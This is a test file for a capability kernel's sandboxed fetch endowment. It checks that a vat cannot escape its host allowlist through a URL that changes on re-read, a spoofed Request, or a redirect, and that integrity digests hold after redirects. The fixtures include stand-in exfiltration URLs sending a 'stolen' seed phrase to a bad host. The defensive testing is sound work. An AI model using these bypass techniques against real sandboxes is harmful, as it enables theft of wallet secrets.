import { makeSQLKernelDatabase } from '@metamask/kernel-store/sqlite/nodejs';
import { waitUntilQuiescent } from '@metamask/kernel-utils';
import type { KRef, VatId } from '@metamask/ocap-kernel';
import { getWorkerFile } from '@ocap/nodejs-test-workers';
import { describe, expect, it } from 'vitest';

import {
  extractTestLogs,
  getBundleSpec,
  makeKernel,
  makeTestLogger,
} from './utils.ts';

describe('endowments', () => {
  it('can use endowments', async () => {
    const expectedResponse = 'Hello, world!';
    const vatId = 'v1' as VatId;
    const v1Root = 'ko4' as KRef;
    const { logger, entries } = makeTestLogger();
    const database = await makeSQLKernelDatabase({});
    const kernel = await makeKernel(
      database,
      true,
      logger,
      getWorkerFile('mock-fetch'),
    );
    const goodHost = 'good-url.test';
    const badHost = 'bad-url.test';
    const vat = await kernel.launchSubcluster({
      bootstrap: 'main',
      vats: {
        main: {
          bundleSpec: getBundleSpec('endowment-fetch'),
          parameters: {},
          globals: ['fetch', 'Request', 'Headers', 'Response'],
          network: {
            allowedHosts: [goodHost],
          },
        },
      },
    });
    expect(vat).toBeDefined();
    const vats = kernel.getVatIds();
    expect(vats).toStrictEqual([vatId]);

    await waitUntilQuiescent();
    await kernel.queueMessage(v1Root, 'hello', [`https://${goodHost}`]);

    await waitUntilQuiescent();

    await expect(
      kernel.queueMessage(v1Root, 'hello', [`https://${badHost}`]),
    ).rejects.toThrow(`Invalid host: ${badHost}`);

    await waitUntilQuiescent();

    const vatLogs = extractTestLogs(entries, vatId);
    expect(vatLogs).toStrictEqual([
      'buildRootObject',
      'bootstrap',
      `response: ${expectedResponse}`,
      `Request constructor: ok`,
      `Headers constructor: ok`,
      `Response constructor: ok`,
      `error: Error: Invalid host: ${badHost}`,
    ]);
  });

  // CWE-367 regression. Both probes live in the endowment-fetch vat bundle.
  it('confines a vat that resolves a fetch input differently on each read', async () => {
    const vatId = 'v1' as VatId;
    const v1Root = 'ko4' as KRef;
    const { logger, entries } = makeTestLogger();
    const database = await makeSQLKernelDatabase({});
    const kernel = await makeKernel(
      database,
      true,
      logger,
      getWorkerFile('mock-fetch'),
    );
    const goodHost = 'good-url.test';
    const badHost = 'bad-url.test';
    await kernel.launchSubcluster({
      bootstrap: 'main',
      vats: {
        main: {
          bundleSpec: getBundleSpec('endowment-fetch'),
          parameters: {},
          globals: ['fetch', 'Request', 'Headers', 'Response'],
          network: { allowedHosts: [goodHost] },
        },
      },
    });
    await waitUntilQuiescent();

    const decoyUrl = `https://${goodHost}/decoy`;
    const targetUrl = `https://${badHost}/exfil?srp=stolen`;

    await kernel.queueMessage(v1Root, 'fetchWithTwoFacedUrl', [
      decoyUrl,
      targetUrl,
    ]);
    await waitUntilQuiescent();

    await kernel.queueMessage(v1Root, 'fetchWithSpoofedRequest', [
      decoyUrl,
      targetUrl,
    ]);
    await waitUntilQuiescent();

    expect(extractTestLogs(entries, vatId)).toStrictEqual([
      'buildRootObject',
      'bootstrap',
      'error: Error: fetch input resolved to a different URL when read again.',
      // Two reads, both the kernel's: it resolves once and checks once.
      'reads: 2',
      // The copy defeats the lying getter; see `resolveFetchInput`.
      `error: Error: Invalid host: ${badHost}`,
    ]);
  });

  // Regression test for the unchecked redirect hop; see `makeGuardedFetch`.
  it('confines a vat whose allowed host redirects it elsewhere', async () => {
    const vatId = 'v1' as VatId;
    const v1Root = 'ko4' as KRef;
    const { logger, entries } = makeTestLogger();
    const database = await makeSQLKernelDatabase({});
    const kernel = await makeKernel(
      database,
      true,
      logger,
      getWorkerFile('mock-fetch'),
    );
    const goodHost = 'good-url.test';
    const badHost = 'bad-url.test';
    await kernel.launchSubcluster({
      bootstrap: 'main',
      vats: {
        main: {
          bundleSpec: getBundleSpec('endowment-fetch'),
          parameters: {},
          globals: ['fetch', 'Request', 'Headers', 'Response'],
          network: { allowedHosts: [goodHost] },
        },
      },
    });
    await waitUntilQuiescent();

    const redirectFrom = (target: string): string =>
      `https://${goodHost}/start?redirectTo=${encodeURIComponent(target)}`;

    await kernel.queueMessage(v1Root, 'fetchFollowingRedirect', [
      redirectFrom(`https://${badHost}/exfil?srp=stolen`),
    ]);
    await waitUntilQuiescent();

    await kernel.queueMessage(v1Root, 'fetchFollowingRedirect', [
      redirectFrom(`https://${goodHost}/landed`),
    ]);
    await waitUntilQuiescent();

    expect(extractTestLogs(entries, vatId)).toStrictEqual([
      'buildRootObject',
      'bootstrap',
      `error: Error: Invalid host: ${badHost}`,
      `fetched: https://${goodHost}/landed`,
      // Overridden all the way through the Snaps endowment, which rebuilds the
      // init before calling the real fetch.
      'redirect mode: manual',
      'redirected: true',
      'body: Hello, world!',
    ]);
  });

  // The digest is spent on the body the chain ends on; see `makeGuardedFetch`.
  it('checks a vat’s integrity against the resource a redirect led to', async () => {
    const vatId = 'v1' as VatId;
    const v1Root = 'ko4' as KRef;
    const { logger, entries } = makeTestLogger();
    const database = await makeSQLKernelDatabase({});
    const kernel = await makeKernel(
      database,
      true,
      logger,
      getWorkerFile('mock-fetch'),
    );
    const goodHost = 'good-url.test';
    await kernel.launchSubcluster({
      bootstrap: 'main',
      vats: {
        main: {
          bundleSpec: getBundleSpec('endowment-fetch'),
          parameters: {},
          globals: ['fetch', 'Request', 'Headers', 'Response'],
          network: { allowedHosts: [goodHost] },
        },
      },
    });
    await waitUntilQuiescent();

    const landed = `https://${goodHost}/landed`;
    const start = `https://${goodHost}/start?redirectTo=${encodeURIComponent(landed)}`;
    // Of `Hello, world!`, which the mock answers `/landed` with.
    const resourceDigest =
      'sha256-MV9b23bQeMQ7isAGTkoBZGErH853yGk0W/yUx1iU7dM=';
    const otherDigest = 'sha256-LPJNul+wow4m6DsqxbninhsWHlwfp0JecwQzYpOLmCQ=';

    await kernel.queueMessage(v1Root, 'fetchWithIntegrity', [
      start,
      resourceDigest,
    ]);
    await waitUntilQuiescent();

    await kernel.queueMessage(v1Root, 'fetchWithIntegrity', [
      start,
      otherDigest,
    ]);
    await waitUntilQuiescent();

    expect(extractTestLogs(entries, vatId)).toStrictEqual([
      'buildRootObject',
      'bootstrap',
      // Read through the hardened Snaps response wrapper, which the digest is
      // checked through too — `fetch` handed the same digest would have held it
      // against the 302's body and failed.
      'body: Hello, world!',
      `error: Error: Fetch of ${landed} does not match the requested integrity \`${otherDigest}\`.`,
    ]);
  });
});
